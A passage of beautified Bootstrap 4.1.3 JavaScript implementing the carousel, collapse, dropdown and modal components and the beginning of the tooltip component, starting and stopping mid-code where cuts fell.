      var t = this;
      this._activeElement = this._element.querySelector(M);
      var n = this._getItemIndex(this._activeElement);
      if (!(e > this._items.length - 1 || e < 0)) if (this._isSliding) C(this._element).one(P.SLID, function () {
        return t.to(e);
      });else {
        if (n === e) return this.pause(), void this.cycle();
        var i = n < e ? A : I;
        this._slide(i, this._items[e]);
      }
    }, _t.dispose = function () {
      C(this._element).off($), C.removeData(this._element, S), this._items = null, this._config = null, this._element = null, this._interval = null, this._isPaused = null, this._isSliding = null, this._activeElement = null, this._indicatorsElement = null;
    }, _t._getConfig = function (e) {
      return e = a({}, D, e), Lt.typeCheckConfig(k, e, _), e;
    }, _t._addEventListeners = function () {
      var t = this;
      this._config.keyboard && C(this._element).on(P.KEYDOWN, function (e) {
        return t._keydown(e);
      }), "hover" === this._config.pause && (C(this._element).on(P.MOUSEENTER, function (e) {
        return t.pause(e);
      }).on(P.MOUSELEAVE, function (e) {
        return t.cycle(e);
      }), "ontouchstart" in document.documentElement && C(this._element).on(P.TOUCHEND, function () {
        t.pause(), t.touchTimeout && clearTimeout(t.touchTimeout), t.touchTimeout = setTimeout(function (e) {
          return t.cycle(e);
        }, 500 + t._config.interval);
      }));
    }, _t._keydown = function (e) {
      if (!/input|textarea/i.test(e.target.tagName)) switch (e.which) {
        case 37:
          e.preventDefault(), this.prev();
          break;
        case 39:
          e.preventDefault(), this.next();
      }
    }, _t._getItemIndex = function (e) {
      return this._items = e && e.parentNode ? [].slice.call(e.parentNode.querySelectorAll(".carousel-item")) : [], this._items.indexOf(e);
    }, _t._getItemByDirection = function (e, t) {
      var n = e === A,
        i = e === I,
        o = this._getItemIndex(t),
        r = this._items.length - 1;
      if ((i && 0 === o || n && o === r) && !this._config.wrap) return t;
      var a = (o + (e === I ? -1 : 1)) % this._items.length;
      return -1 == a ? this._items[this._items.length - 1] : this._items[a];
    }, _t._triggerSlideEvent = function (e, t) {
      var n = this._getItemIndex(e),
        i = this._getItemIndex(this._element.querySelector(M)),
        o = C.Event(P.SLIDE, {
          relatedTarget: e,
          direction: t,
          from: i,
          to: n
        });
      return C(this._element).trigger(o), o;
    }, _t._setActiveIndicatorElement = function (e) {
      if (this._indicatorsElement) {
        var t = [].slice.call(this._indicatorsElement.querySelectorAll(".active"));
        C(t).removeClass(H);
        var n = this._indicatorsElement.children[this._getItemIndex(e)];
        n && C(n).addClass(H);
      }
    }, _t._slide = function (e, t) {
      var n,
        i,
        o,
        r = this,
        a = this._element.querySelector(M),
        s = this._getItemIndex(a),
        l = t || a && this._getItemByDirection(e, a),
        d = this._getItemIndex(l),
        c = Boolean(this._interval);
      if (o = e === A ? (n = "carousel-item-left", i = "carousel-item-next", "left") : (n = "carousel-item-right", i = "carousel-item-prev", "right"), l && C(l).hasClass(H)) this._isSliding = !1;else if (!this._triggerSlideEvent(l, o).isDefaultPrevented() && a && l) {
        this._isSliding = !0, c && this.pause(), this._setActiveIndicatorElement(l);
        var u = C.Event(P.SLID, {
          relatedTarget: l,
          direction: o,
          from: s,
          to: d
        });
        if (C(this._element).hasClass("slide")) {
          C(l).addClass(i), Lt.reflow(l), C(a).addClass(n), C(l).addClass(n);
          var p = Lt.getTransitionDurationFromElement(a);
          C(a).one(Lt.TRANSITION_END, function () {
            C(l).removeClass(n + " " + i).addClass(H), C(a).removeClass(H + " " + i + " " + n), r._isSliding = !1, setTimeout(function () {
              return C(r._element).trigger(u);
            }, 0);
          }).emulateTransitionEnd(p);
        } else C(a).removeClass(H), C(l).addClass(H), this._isSliding = !1, C(this._element).trigger(u);
        c && this.cycle();
      }
    }, Zt._jQueryInterface = function (i) {
      return this.each(function () {
        var e = C(this).data(S),
          t = a({}, D, C(this).data());
        "object" == typeof i && (t = a({}, t, i));
        var n = "string" == typeof i ? i : t.slide;
        if (e || (e = new Zt(this, t), C(this).data(S, e)), "number" == typeof i) e.to(i);else if ("string" == typeof n) {
          if (void 0 === e[n]) throw new TypeError('No method named "' + n + '"');
          e[n]();
        } else t.interval && (e.pause(), e.cycle());
      });
    }, Zt._dataApiClickHandler = function (e) {
      var t = Lt.getSelectorFromElement(this);
      if (t) {
        var n = C(t)[0];
        if (n && C(n).hasClass("carousel")) {
          var i = a({}, C(n).data(), C(this).data()),
            o = this.getAttribute("data-slide-to");
          o && (i.interval = !1), Zt._jQueryInterface.call(C(n), i), o && C(n).data(S).to(o), e.preventDefault();
        }
      }
    }, r(Zt, null, [{
      key: "VERSION",
      get: function () {
        return "4.1.3";
      }
    }, {
      key: "Default",
      get: function () {
        return D;
      }
    }]), L = Zt, C(document).on(P.CLICK_DATA_API, "[data-slide], [data-slide-to]", L._dataApiClickHandler), C(window).on(P.LOAD_DATA_API, function () {
      for (var e = [].slice.call(document.querySelectorAll('[data-ride="carousel"]')), t = 0, n = e.length; t < n; t++) {
        var i = C(e[t]);
        L._jQueryInterface.call(i, i.data());
      }
    }), C.fn[k] = L._jQueryInterface, C.fn[k].Constructor = L, C.fn[k].noConflict = function () {
      return C.fn[k] = E, L._jQueryInterface;
    }, L),
    Ft = (O = "collapse", F = "." + (R = "bs.collapse"), B = (N = t).fn[O], z = {
      toggle: !0,
      parent: ""
    }, q = {
      toggle: "boolean",
      parent: "(string|element)"
    }, W = {
      SHOW: "show" + F,
      SHOWN: "shown" + F,
      HIDE: "hide" + F,
      HIDDEN: "hidden" + F,
      CLICK_DATA_API: "click" + F + ".data-api"
    }, U = "show", Y = "collapse", X = "collapsing", V = "collapsed", K = '[data-toggle="collapse"]', (Dt = Jt.prototype).toggle = function () {
      N(this._element).hasClass(U) ? this.hide() : this.show();
    }, Dt.show = function () {
      var e,
        t,
        n = this;
      if (!(this._isTransitioning || N(this._element).hasClass(U) || (this._parent && 0 === (e = [].slice.call(this._parent.querySelectorAll(".show, .collapsing")).filter(function (e) {
        return e.getAttribute("data-parent") === n._config.parent;
      })).length && (e = null), e && (t = N(e).not(this._selector).data(R)) && t._isTransitioning))) {
        var i = N.Event(W.SHOW);
        if (N(this._element).trigger(i), !i.isDefaultPrevented()) {
          e && (Jt._jQueryInterface.call(N(e).not(this._selector), "hide"), t || N(e).data(R, null));
          var o = this._getDimension();
          N(this._element).removeClass(Y).addClass(X), this._element.style[o] = 0, this._triggerArray.length && N(this._triggerArray).removeClass(V).attr("aria-expanded", !0), this.setTransitioning(!0);
          var r = "scroll" + (o[0].toUpperCase() + o.slice(1)),
            a = Lt.getTransitionDurationFromElement(this._element);
          N(this._element).one(Lt.TRANSITION_END, function () {
            N(n._element).removeClass(X).addClass(Y).addClass(U), n._element.style[o] = "", n.setTransitioning(!1), N(n._element).trigger(W.SHOWN);
          }).emulateTransitionEnd(a), this._element.style[o] = this._element[r] + "px";
        }
      }
    }, Dt.hide = function () {
      var e = this;
      if (!this._isTransitioning && N(this._element).hasClass(U)) {
        var t = N.Event(W.HIDE);
        if (N(this._element).trigger(t), !t.isDefaultPrevented()) {
          var n = this._getDimension();
          this._element.style[n] = this._element.getBoundingClientRect()[n] + "px", Lt.reflow(this._element), N(this._element).addClass(X).removeClass(Y).removeClass(U);
          var i = this._triggerArray.length;
          if (0 < i) for (var o = 0; o < i; o++) {
            var r = this._triggerArray[o],
              a = Lt.getSelectorFromElement(r);
            null !== a && (N([].slice.call(document.querySelectorAll(a))).hasClass(U) || N(r).addClass(V).attr("aria-expanded", !1));
          }
          this.setTransitioning(!0), this._element.style[n] = "";
          var s = Lt.getTransitionDurationFromElement(this._element);
          N(this._element).one(Lt.TRANSITION_END, function () {
            e.setTransitioning(!1), N(e._element).removeClass(X).addClass(Y).trigger(W.HIDDEN);
          }).emulateTransitionEnd(s);
        }
      }
    }, Dt.setTransitioning = function (e) {
      this._isTransitioning = e;
    }, Dt.dispose = function () {
      N.removeData(this._element, R), this._config = null, this._parent = null, this._element = null, this._triggerArray = null, this._isTransitioning = null;
    }, Dt._getConfig = function (e) {
      return (e = a({}, z, e)).toggle = Boolean(e.toggle), Lt.typeCheckConfig(O, e, q), e;
    }, Dt._getDimension = function () {
      return N(this._element).hasClass("width") ? "width" : "height";
    }, Dt._getParent = function () {
      var n = this,
        e = null;
      Lt.isElement(this._config.parent) ? (e = this._config.parent, void 0 !== this._config.parent.jquery && (e = this._config.parent[0])) : e = document.querySelector(this._config.parent);
      var t = '[data-toggle="collapse"][data-parent="' + this._config.parent + '"]',
        i = [].slice.call(e.querySelectorAll(t));
      return N(i).each(function (e, t) {
        n._addAriaAndCollapsedClass(Jt._getTargetFromElement(t), [t]);
      }), e;
    }, Dt._addAriaAndCollapsedClass = function (e, t) {
      if (e) {
        var n = N(e).hasClass(U);
        t.length && N(t).toggleClass(V, !n).attr("aria-expanded", n);
      }
    }, Jt._getTargetFromElement = function (e) {
      var t = Lt.getSelectorFromElement(e);
      return t ? document.querySelector(t) : null;
    }, Jt._jQueryInterface = function (i) {
      return this.each(function () {
        var e = N(this),
          t = e.data(R),
          n = a({}, z, e.data(), "object" == typeof i && i ? i : {});
        if (!t && n.toggle && /show|hide/.test(i) && (n.toggle = !1), t || (t = new Jt(this, n), e.data(R, t)), "string" == typeof i) {
          if (void 0 === t[i]) throw new TypeError('No method named "' + i + '"');
          t[i]();
        }
      });
    }, r(Jt, null, [{
      key: "VERSION",
      get: function () {
        return "4.1.3";
      }
    }, {
      key: "Default",
      get: function () {
        return z;
      }
    }]), Q = Jt, N(document).on(W.CLICK_DATA_API, K, function (e) {
      "A" === e.currentTarget.tagName && e.preventDefault();
      var n = N(this),
        t = Lt.getSelectorFromElement(this),
        i = [].slice.call(document.querySelectorAll(t));
      N(i).each(function () {
        var e = N(this),
          t = e.data(R) ? "toggle" : n.data();
        Q._jQueryInterface.call(e, t);
      });
    }), N.fn[O] = Q._jQueryInterface, N.fn[O].Constructor = Q, N.fn[O].noConflict = function () {
      return N.fn[O] = B, Q._jQueryInterface;
    }, Q),
    Bt = (J = "dropdown", ee = "." + (Z = "bs.dropdown"), te = ".data-api", ne = (G = t).fn[J], ie = new RegExp("38|40|27"), oe = {
      HIDE: "hide" + ee,
      HIDDEN: "hidden" + ee,
      SHOW: "show" + ee,
      SHOWN: "shown" + ee,
      CLICK: "click" + ee,
      CLICK_DATA_API: "click" + ee + te,
      KEYDOWN_DATA_API: "keydown" + ee + te,
      KEYUP_DATA_API: "keyup" + ee + te
    }, re = "disabled", ae = "show", se = "dropdown-menu-right", le = '[data-toggle="dropdown"]', de = ".dropdown-menu", ce = {
      offset: 0,
      flip: !0,
      boundary: "scrollParent",
      reference: "toggle",
      display: "dynamic"
    }, ue = {
      offset: "(number|string|function)",
      flip: "boolean",
      boundary: "(string|element)",
      reference: "(string|element)",
      display: "string"
    }, (Et = Gt.prototype).toggle = function () {
      if (!this._element.disabled && !G(this._element).hasClass(re)) {
        var e = Gt._getParentFromElement(this._element),
          t = G(this._menu).hasClass(ae);
        if (Gt._clearMenus(), !t) {
          var n = {
              relatedTarget: this._element
            },
            i = G.Event(oe.SHOW, n);
          if (G(e).trigger(i), !i.isDefaultPrevented()) {
            if (!this._inNavbar) {
              if (void 0 === c) throw new TypeError("Bootstrap dropdown require Popper.js (https://popper.js.org)");
              var o = this._element;
              "parent" === this._config.reference ? o = e : Lt.isElement(this._config.reference) && (o = this._config.reference, void 0 !== this._config.reference.jquery && (o = this._config.reference[0])), "scrollParent" !== this._config.boundary && G(e).addClass("position-static"), this._popper = new c(o, this._menu, this._getPopperConfig());
            }
            "ontouchstart" in document.documentElement && 0 === G(e).closest(".navbar-nav").length && G(document.body).children().on("mouseover", null, G.noop), this._element.focus(), this._element.setAttribute("aria-expanded", !0), G(this._menu).toggleClass(ae), G(e).toggleClass(ae).trigger(G.Event(oe.SHOWN, n));
          }
        }
      }
    }, Et.dispose = function () {
      G.removeData(this._element, Z), G(this._element).off(ee), this._element = null, (this._menu = null) !== this._popper && (this._popper.destroy(), this._popper = null);
    }, Et.update = function () {
      this._inNavbar = this._detectNavbar(), null !== this._popper && this._popper.scheduleUpdate();
    }, Et._addEventListeners = function () {
      var t = this;
      G(this._element).on(oe.CLICK, function (e) {
        e.preventDefault(), e.stopPropagation(), t.toggle();
      });
    }, Et._getConfig = function (e) {
      return e = a({}, this.constructor.Default, G(this._element).data(), e), Lt.typeCheckConfig(J, e, this.constructor.DefaultType), e;
    }, Et._getMenuElement = function () {
      if (!this._menu) {
        var e = Gt._getParentFromElement(this._element);
        e && (this._menu = e.querySelector(de));
      }
      return this._menu;
    }, Et._getPlacement = function () {
      var e = G(this._element.parentNode),
        t = "bottom-start";
      return e.hasClass("dropup") ? (t = "top-start", G(this._menu).hasClass(se) && (t = "top-end")) : e.hasClass("dropright") ? t = "right-start" : e.hasClass("dropleft") ? t = "left-start" : G(this._menu).hasClass(se) && (t = "bottom-end"), t;
    }, Et._detectNavbar = function () {
      return 0 < G(this._element).closest(".navbar").length;
    }, Et._getPopperConfig = function () {
      var t = this,
        e = {};
      "function" == typeof this._config.offset ? e.fn = function (e) {
        return e.offsets = a({}, e.offsets, t._config.offset(e.offsets) || {}), e;
      } : e.offset = this._config.offset;
      var n = {
        placement: this._getPlacement(),
        modifiers: {
          offset: e,
          flip: {
            enabled: this._config.flip
          },
          preventOverflow: {
            boundariesElement: this._config.boundary
          }
        }
      };
      return "static" === this._config.display && (n.modifiers.applyStyle = {
        enabled: !1
      }), n;
    }, Gt._jQueryInterface = function (t) {
      return this.each(function () {
        var e = G(this).data(Z);
        if (e || (e = new Gt(this, "object" == typeof t ? t : null), G(this).data(Z, e)), "string" == typeof t) {
          if (void 0 === e[t]) throw new TypeError('No method named "' + t + '"');
          e[t]();
        }
      });
    }, Gt._clearMenus = function (e) {
      if (!e || 3 !== e.which && ("keyup" !== e.type || 9 === e.which)) for (var t = [].slice.call(document.querySelectorAll(le)), n = 0, i = t.length; n < i; n++) {
        var o = Gt._getParentFromElement(t[n]),
          r = G(t[n]).data(Z),
          a = {
            relatedTarget: t[n]
          };
        if (e && "click" === e.type && (a.clickEvent = e), r) {
          var s = r._menu;
          if (G(o).hasClass(ae) && !(e && ("click" === e.type && /input|textarea/i.test(e.target.tagName) || "keyup" === e.type && 9 === e.which) && G.contains(o, e.target))) {
            var l = G.Event(oe.HIDE, a);
            G(o).trigger(l), l.isDefaultPrevented() || ("ontouchstart" in document.documentElement && G(document.body).children().off("mouseover", null, G.noop), t[n].setAttribute("aria-expanded", "false"), G(s).removeClass(ae), G(o).removeClass(ae).trigger(G.Event(oe.HIDDEN, a)));
          }
        }
      }
    }, Gt._getParentFromElement = function (e) {
      var t,
        n = Lt.getSelectorFromElement(e);
      return n && (t = document.querySelector(n)), t || e.parentNode;
    }, Gt._dataApiKeydownHandler = function (e) {
      if ((/input|textarea/i.test(e.target.tagName) ? !(32 === e.which || 27 !== e.which && (40 !== e.which && 38 !== e.which || G(e.target).closest(de).length)) : ie.test(e.which)) && (e.preventDefault(), e.stopPropagation(), !this.disabled && !G(this).hasClass(re))) {
        var t = Gt._getParentFromElement(this),
          n = G(t).hasClass(ae);
        if ((n || 27 === e.which && 32 === e.which) && (!n || 27 !== e.which && 32 !== e.which)) {
          var i = [].slice.call(t.querySelectorAll(".dropdown-menu .dropdown-item:not(.disabled):not(:disabled)"));
          if (0 !== i.length) {
            var o = i.indexOf(e.target);
            38 === e.which && 0 < o && o--, 40 === e.which && o < i.length - 1 && o++, o < 0 && (o = 0), i[o].focus();
          }
        } else {
          if (27 === e.which) {
            var r = t.querySelector(le);
            G(r).trigger("focus");
          }
          G(this).trigger("click");
        }
      }
    }, r(Gt, null, [{
      key: "VERSION",
      get: function () {
        return "4.1.3";
      }
    }, {
      key: "Default",
      get: function () {
        return ce;
      }
    }, {
      key: "DefaultType",
      get: function () {
        return ue;
      }
    }]), pe = Gt, G(document).on(oe.KEYDOWN_DATA_API, le, pe._dataApiKeydownHandler).on(oe.KEYDOWN_DATA_API, de, pe._dataApiKeydownHandler).on(oe.CLICK_DATA_API + " " + oe.KEYUP_DATA_API, pe._clearMenus).on(oe.CLICK_DATA_API, le, function (e) {
      e.preventDefault(), e.stopPropagation(), pe._jQueryInterface.call(G(this), "toggle");
    }).on(oe.CLICK_DATA_API, ".dropdown form", function (e) {
      e.stopPropagation();
    }), G.fn[J] = pe._jQueryInterface, G.fn[J].Constructor = pe, G.fn[J].noConflict = function () {
      return G.fn[J] = ne, pe._jQueryInterface;
    }, pe),
    zt = (fe = "modal", me = "." + (ge = "bs.modal"), ve = (he = t).fn[fe], ye = {
      backdrop: !0,
      keyboard: !0,
      focus: !0,
      show: !0
    }, be = {
      backdrop: "(boolean|string)",
      keyboard: "boolean",
      focus: "boolean",
      show: "boolean"
    }, we = {
      HIDE: "hide" + me,
      HIDDEN: "hidden" + me,
      SHOW: "show" + me,
      SHOWN: "shown" + me,
      FOCUSIN: "focusin" + me,
      RESIZE: "resize" + me,
      CLICK_DISMISS: "click.dismiss" + me,
      KEYDOWN_DISMISS: "keydown.dismiss" + me,
      MOUSEUP_DISMISS: "mouseup.dismiss" + me,
      MOUSEDOWN_DISMISS: "mousedown.dismiss" + me,
      CLICK_DATA_API: "click" + me + ".data-api"
    }, xe = "modal-open", je = "fade", Ce = "show", ke = ".fixed-top, .fixed-bottom, .is-fixed, .sticky-top", Se = ".sticky-top", (Tt = Qt.prototype).toggle = function (e) {
      return this._isShown ? this.hide() : this.show(e);
    }, Tt.show = function (e) {
      var t = this;
      if (!this._isTransitioning && !this._isShown) {
        he(this._element).hasClass(je) && (this._isTransitioning = !0);
        var n = he.Event(we.SHOW, {
          relatedTarget: e
        });
        he(this._element).trigger(n), this._isShown || n.isDefaultPrevented() || (this._isShown = !0, this._checkScrollbar(), this._setScrollbar(), this._adjustDialog(), he(document.body).addClass(xe), this._setEscapeEvent(), this._setResizeEvent(), he(this._element).on(we.CLICK_DISMISS, '[data-dismiss="modal"]', function (e) {
          return t.hide(e);
        }), he(this._dialog).on(we.MOUSEDOWN_DISMISS, function () {
          he(t._element).one(we.MOUSEUP_DISMISS, function (e) {
            he(e.target).is(t._element) && (t._ignoreBackdropClick = !0);
          });
        }), this._showBackdrop(function () {
          return t._showElement(e);
        }));
      }
    }, Tt.hide = function (e) {
      var t = this;
      if (e && e.preventDefault(), !this._isTransitioning && this._isShown) {
        var n = he.Event(we.HIDE);
        if (he(this._element).trigger(n), this._isShown && !n.isDefaultPrevented()) {
          this._isShown = !1;
          var i = he(this._element).hasClass(je);
          if (i && (this._isTransitioning = !0), this._setEscapeEvent(), this._setResizeEvent(), he(document).off(we.FOCUSIN), he(this._element).removeClass(Ce), he(this._element).off(we.CLICK_DISMISS), he(this._dialog).off(we.MOUSEDOWN_DISMISS), i) {
            var o = Lt.getTransitionDurationFromElement(this._element);
            he(this._element).one(Lt.TRANSITION_END, function (e) {
              return t._hideModal(e);
            }).emulateTransitionEnd(o);
          } else this._hideModal();
        }
      }
    }, Tt.dispose = function () {
      he.removeData(this._element, ge), he(window, document, this._element, this._backdrop).off(me), this._config = null, this._element = null, this._dialog = null, this._backdrop = null, this._isShown = null, this._isBodyOverflowing = null, this._ignoreBackdropClick = null, this._scrollbarWidth = null;
    }, Tt.handleUpdate = function () {
      this._adjustDialog();
    }, Tt._getConfig = function (e) {
      return e = a({}, ye, e), Lt.typeCheckConfig(fe, e, be), e;
    }, Tt._showElement = function (e) {
      var t = this,
        n = he(this._element).hasClass(je);
      function i() {
        t._config.focus && t._element.focus(), t._isTransitioning = !1, he(t._element).trigger(o);
      }
      this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE || document.body.appendChild(this._element), this._element.style.display = "block", this._element.removeAttribute("aria-hidden"), this._element.scrollTop = 0, n && Lt.reflow(this._element), he(this._element).addClass(Ce), this._config.focus && this._enforceFocus();
      var o = he.Event(we.SHOWN, {
        relatedTarget: e
      });
      if (n) {
        var r = Lt.getTransitionDurationFromElement(this._element);
        he(this._dialog).one(Lt.TRANSITION_END, i).emulateTransitionEnd(r);
      } else i();
    }, Tt._enforceFocus = function () {
      var t = this;
      he(document).off(we.FOCUSIN).on(we.FOCUSIN, function (e) {
        document !== e.target && t._element !== e.target && 0 === he(t._element).has(e.target).length && t._element.focus();
      });
    }, Tt._setEscapeEvent = function () {
      var t = this;
      this._isShown && this._config.keyboard ? he(this._element).on(we.KEYDOWN_DISMISS, function (e) {
        27 === e.which && (e.preventDefault(), t.hide());
      }) : this._isShown || he(this._element).off(we.KEYDOWN_DISMISS);
    }, Tt._setResizeEvent = function () {
      var t = this;
      this._isShown ? he(window).on(we.RESIZE, function (e) {
        return t.handleUpdate(e);
      }) : he(window).off(we.RESIZE);
    }, Tt._hideModal = function () {
      var e = this;
      this._element.style.display = "none", this._element.setAttribute("aria-hidden", !0), this._isTransitioning = !1, this._showBackdrop(function () {
        he(document.body).removeClass(xe), e._resetAdjustments(), e._resetScrollbar(), he(e._element).trigger(we.HIDDEN);
      });
    }, Tt._removeBackdrop = function () {
      this._backdrop && (he(this._backdrop).remove(), this._backdrop = null);
    }, Tt._showBackdrop = function (e) {
      var t = this,
        n = he(this._element).hasClass(je) ? je : "";
      if (this._isShown && this._config.backdrop) {
        if (this._backdrop = document.createElement("div"), this._backdrop.className = "modal-backdrop", n && this._backdrop.classList.add(n), he(this._backdrop).appendTo(document.body), he(this._element).on(we.CLICK_DISMISS, function (e) {
          t._ignoreBackdropClick ? t._ignoreBackdropClick = !1 : e.target === e.currentTarget && ("static" === t._config.backdrop ? t._element.focus() : t.hide());
        }), n && Lt.reflow(this._backdrop), he(this._backdrop).addClass(Ce), !e) return;
        if (!n) return void e();
        var i = Lt.getTransitionDurationFromElement(this._backdrop);
        he(this._backdrop).one(Lt.TRANSITION_END, e).emulateTransitionEnd(i);
      } else if (!this._isShown && this._backdrop) {
        he(this._backdrop).removeClass(Ce);
        var o = function () {
          t._removeBackdrop(), e && e();
        };
        if (he(this._element).hasClass(je)) {
          var r = Lt.getTransitionDurationFromElement(this._backdrop);
          he(this._backdrop).one(Lt.TRANSITION_END, o).emulateTransitionEnd(r);
        } else o();
      } else e && e();
    }, Tt._adjustDialog = function () {
      var e = this._element.scrollHeight > document.documentElement.clientHeight;
      !this._isBodyOverflowing && e && (this._element.style.paddingLeft = this._scrollbarWidth + "px"), this._isBodyOverflowing && !e && (this._element.style.paddingRight = this._scrollbarWidth + "px");
    }, Tt._resetAdjustments = function () {
      this._element.style.paddingLeft = "", this._element.style.paddingRight = "";
    }, Tt._checkScrollbar = function () {
      var e = document.body.getBoundingClientRect();
      this._isBodyOverflowing = e.left + e.right < window.innerWidth, this._scrollbarWidth = this._getScrollbarWidth();
    }, Tt._setScrollbar = function () {
      var o = this;
      if (this._isBodyOverflowing) {
        var e = [].slice.call(document.querySelectorAll(ke)),
          t = [].slice.call(document.querySelectorAll(Se));
        he(e).each(function (e, t) {
          var n = t.style.paddingRight,
            i = he(t).css("padding-right");
          he(t).data("padding-right", n).css("padding-right", parseFloat(i) + o._scrollbarWidth + "px");
        }), he(t).each(function (e, t) {
          var n = t.style.marginRight,
            i = he(t).css("margin-right");
          he(t).data("margin-right", n).css("margin-right", parseFloat(i) - o._scrollbarWidth + "px");
        });
        var n = document.body.style.paddingRight,
          i = he(document.body).css("padding-right");
        he(document.body).data("padding-right", n).css("padding-right", parseFloat(i) + this._scrollbarWidth + "px");
      }
    }, Tt._resetScrollbar = function () {
      var e = [].slice.call(document.querySelectorAll(ke));
      he(e).each(function (e, t) {
        var n = he(t).data("padding-right");
        he(t).removeData("padding-right"), t.style.paddingRight = n || "";
      });
      var t = [].slice.call(document.querySelectorAll(Se));
      he(t).each(function (e, t) {
        var n = he(t).data("margin-right");
        void 0 !== n && he(t).css("margin-right", n).removeData("margin-right");
      });
      var n = he(document.body).data("padding-right");
      he(document.body).removeData("padding-right"), document.body.style.paddingRight = n || "";
    }, Tt._getScrollbarWidth = function () {
      var e = document.createElement("div");
      e.className = "modal-scrollbar-measure", document.body.appendChild(e);
      var t = e.getBoundingClientRect().width - e.clientWidth;
      return document.body.removeChild(e), t;
    }, Qt._jQueryInterface = function (n, i) {
      return this.each(function () {
        var e = he(this).data(ge),
          t = a({}, ye, he(this).data(), "object" == typeof n && n ? n : {});
        if (e || (e = new Qt(this, t), he(this).data(ge, e)), "string" == typeof n) {
          if (void 0 === e[n]) throw new TypeError('No method named "' + n + '"');
          e[n](i);
        } else t.show && e.show(i);
      });
    }, r(Qt, null, [{
      key: "VERSION",
      get: function () {
        return "4.1.3";
      }
    }, {
      key: "Default",
      get: function () {
        return ye;
      }
    }]), $e = Qt, he(document).on(we.CLICK_DATA_API, '[data-toggle="modal"]', function (e) {
      var t,
        n = this,
        i = Lt.getSelectorFromElement(this);
      i && (t = document.querySelector(i));
      var o = he(t).data(ge) ? "toggle" : a({}, he(t).data(), he(this).data());
      "A" !== this.tagName && "AREA" !== this.tagName || e.preventDefault();
      var r = he(t).one(we.SHOW, function (e) {
        e.isDefaultPrevented() || r.one(we.HIDDEN, function () {
          he(n).is(":visible") && n.focus();
        });
      });
      $e._jQueryInterface.call(he(t), o, this);
    }), he.fn[fe] = $e._jQueryInterface, he.fn[fe].Constructor = $e, he.fn[fe].noConflict = function () {
      return he.fn[fe] = ve, $e._jQueryInterface;
    }, $e),
    qt = (Ee = "tooltip", _e = "." + (De = "bs.tooltip"), Ae = (Te = t).fn[Ee], Ie = "bs-tooltip", Pe = new RegExp("(^|\\s)" + Ie + "\\S+", "g"), Le = {
      animation: !0,
      template: '<div class="tooltip" role="tooltip"><div class="arrow"></div><div class="tooltip-inner"></div></div>',
      trigger: "hover focus",
      title: "",
      delay: 0,
      html: !(Me = {
        AUTO: "auto",
        TOP: "top",
        RIGHT: "right",
        BOTTOM: "bottom",
        LEFT: "left"
      }),
      selector: !(He = {
        animation: "boolean",
        template: "string",
        title: "(string|element|function)",
        trigger: "string",
        delay: "(number|object)",
        html: "boolean",
        selector: "(string|boolean)",
        placement: "(string|function)",
        offset: "(number|string)",
        container: "(string|element|boolean)",
        fallbackPlacement: "(string|array)",
        boundary: "(string|element)"
      }),
      placement: "top",
      offset: 0,
      container: !1,
      fallbackPlacement: "flip",
      boundary: "scrollParent"
    }, Oe = {
      HIDE: "hide" + _e,
      HIDDEN: "hidden" + _e,
      SHOW: (Ne = "show") + _e,
      SHOWN: "shown" + _e,
      INSERTED: "inserted" + _e,
      CLICK: "click" + _e,
      FOCUSIN: "focusin" + _e,
      FOCUSOUT: "focusout" + _e,
      MOUSEENTER: "mouseenter" + _e,
      MOUSELEAVE: "mouseleave" + _e
    }, Re = "fade", Fe = "show", Be = "hover", ze = "focus", ($t = Kt.prototype).enable = function () {
      this._isEnabled = !0;
    }, $t.disable = function () {
      this._isEnabled = !1;
    }, $t.toggleEnabled = function () {
      this._isEnabled = !this._isEnabled;
    }, $t.toggle = function (e) {
      if (this._isEnabled) if (e) {
        var t = this.constructor.DATA_KEY,
          n = Te(e.currentTarget).data(t);
        n || (n = new this.constructor(e.currentTarget, this._getDelegateConfig()), Te(e.currentTarget).data(t, n)), n._activeTrigger.click = !n._activeTrigger.click, n._isWithActiveTrigger() ? n._enter(null, n) : n._leave(null, n);
      } else {
        if (Te(this.getTipElement()).hasClass(Fe)) return void this._leave(null, this);
        this._enter(null, this);
      }
    }, $t.dispose = function () {
      clearTimeout(this._timeout), Te.removeData(this.element, this.constructor.DATA_KEY), Te(this.element).off(this.constructor.EVENT_KEY), Te(this.element).closest(".modal").off("hide.bs.modal"), this.tip && Te(this.tip).remove(), this._isEnabled = null, this._timeout = null, this._hoverState = null, (this._activeTrigger = null) !== this._popper && this._popper.destroy(), this._popper = null, this.element = null, this.config = null, this.tip = null;
    }, $t.show = function () {
      var t = this;
      if ("none" === Te(this.element).css("display")) throw new Error("Please use show on visible elements");
      var e = Te.Event(this.constructor.Event.SHOW);
      if (this.isWithContent() && this._isEnabled) {
        Te(this.element).trigger(e);
        var n = Te.contains(this.element.ownerDocument.documentElement, this.element);
        if (e.isDefaultPrevented() || !n) return;
        var i = this.getTipElement(),
          o = Lt.getUID(this.constructor.NAME);
        i.setAttribute("id", o), this.element.setAttribute("aria-describedby", o), this.setContent(), this.config.animation && Te(i).addClass(Re);
        var r = "function" == typeof this.config.placement ? this.config.placement.call(this, i, this.element) : this.config.placement,
          a = this._getAttachment(r);
        this.addAttachmentClass(a);
        var s = !1 === this.config.container ? document.body : Te(document).find(this.config.container);
        Te(i).data(this.constructor.DATA_KEY, this), Te.contains(this.element.ownerDocument.documentElement, this.tip) || Te(i).appendTo(s), Te(this.element).trigger(this.constructor.Event.INSERTED), this._popper = new c(this.element, i, {
          placement: a,
          modifiers: {
            offset: {
              offset: this.config.offset
            },
            flip: {
              behavior: this.config.fallbackPlacement
            },
            arrow: {
              element: ".arrow"
            },
            preventOverflow: {
              boundariesElement: this.config.boundary
            }
          },
          onCreate: function (e) {
            e.originalPlacement !== e.placement && t._handlePopperPlacementChange(e);
          },
          onUpdate: function (e) {
            t._handlePopperPlacementChange(e);
          }
        }), Te(i).addClass(Fe), "ontouchstart" in document.documentElement && Te(document.body).children().on("mouseover", null, Te.noop);
        var l = function () {
          t.config.animation && t._fixTransition();
          var e = t._hoverState;
          t._hoverState = null, Te(t.element).trigger(t.constructor.Event.SHOWN), "out" === e && t._leave(null, t);
        };
        if (Te(this.tip).hasClass(Re)) {
          var d = Lt.getTransitionDurationFromElement(this.tip);
          Te(this.tip).one(Lt.TRANSITION_END, l).emulateTransitionEnd(d);
        } else l();
      }
    }, $t.hide = function (e) {
      function t() {
        n._hoverState !== Ne && i.parentNode && i.parentNode.removeChild(i), n._cleanTipClass(), n.element.removeAttribute("aria-describedby"), Te(n.element).trigger(n.constructor.Event.HIDDEN), null !== n._popper && n._popper.destroy(), e && e();
      }
      var n = this,
        i = this.getTipElement(),
